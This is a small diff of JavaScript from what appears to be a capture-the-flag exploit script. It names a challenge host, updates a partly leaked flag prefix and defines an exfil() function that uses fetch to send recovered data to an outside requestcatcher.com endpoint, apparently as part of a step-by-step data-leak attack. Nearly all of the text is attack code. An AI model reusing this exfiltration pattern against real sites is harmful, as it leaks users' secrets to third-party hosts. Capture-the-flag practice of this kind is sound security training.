@@ -2,7 +2,7 @@
 // v11 - minimal exfil via requestcatcher, continue from verified prefix
 var T="https://svfgp.breakable.live";
 var W="https://h32enj12.requestcatcher.com";
-var known="CTF{1390e7327d4c2069a9";
+var known="CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9";
 var HEX="0123456789abcdef";
 
 function exfil(d){fetch(W+"/"+encodeURIComponent(d),{mode:"no-cors"}).catch(function(){});}
